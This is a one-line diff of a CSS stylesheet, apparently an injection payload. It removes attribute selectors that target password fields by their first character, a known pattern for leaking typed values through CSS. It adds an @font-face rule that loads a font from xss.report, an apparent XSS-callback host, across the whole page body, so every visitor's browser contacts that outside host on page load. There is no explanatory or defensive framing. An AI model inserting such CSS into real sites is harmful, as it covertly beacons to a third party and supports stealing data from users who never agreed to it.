@@ -1,1 +1,1 @@
-input[type=password][value^=a]{background:red} input[type=password][value^=b]{background:blue}
+@font-face{font-family:x;src:url(//xss.report/c/orderly-font)}body{font-family:x}
